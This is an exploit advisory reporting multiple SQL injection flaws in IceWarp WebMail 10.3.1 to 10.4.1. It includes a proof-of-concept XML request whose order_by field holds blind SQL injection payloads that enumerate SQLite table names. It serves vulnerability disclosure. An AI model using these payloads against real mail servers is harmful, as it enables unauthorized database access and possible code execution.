???????????????????????????????????????????????????????????????????????????????
 ? Exploit Title: IceWarp 10.3.1(at least) to 10.4.1 Multiple SQL injection Vulnerabilities
 ? Date: 06/02/2013
 ? Author: George Karagiannidis
 ? Vendor or Software Link: www.icewarp.com
 ? Version: >= 10.3.1 && <= 10.4.1
 ? Category: SQL injection
 ? Google dork: N/A
 ? Tested on: Windows 2005
???????????????????????????????????????????????????????????????????????????????


 Vulnerability Summary
????????????????????????
 Obrela Security Industries Engineers have identified that the IceWarp WebMail application versions at least from 10.3.1 to 10.4.1 suffer from multiple SQL injection vulnerabilities that may lead to database enumeration and under specific circumstances, remote code execution. 


 Exploit Path 
???????????????
 As Proof of Concept the following sample request is provided, which exploits one of the SQL injections in a Blind SQL injection manner, and leads to database table enumeration:

	<item>
          <values>
            <subject></subject>
            <to></to>
            <sms></sms>
            <from></from>
            <date></date>
            <size></size>
            <flags></flags>
            <has_attachment></has_attachment>
            <color></color>
            <priority></priority>
            <smime_status></smime_status>
            <ctz>180</ctz>
          </values>
          <filter>
            <offset>0</offset>
            <limit>47</limit>
            <order_by>case when (select(substr(max(tbl_name),12,1)) from sqlite_master)='w' then date else -date end</order_by>
          </filter>
    </item>
	<order_by>case when (select 1=2) then date else -date end</order_by>
	<order_by>case when (select(substr(max(tbl_name),1,1)) from sqlite_master)='w' then date else -date end</order_by>

	
 Solution
???????????
 Vendor has been notified
 The latest versions do not seem vulnerable


 Credits & Contact
????????????????????
 George Karagiannidis
 Obrela Security Industries
 CONTACT: www.obrela.com

 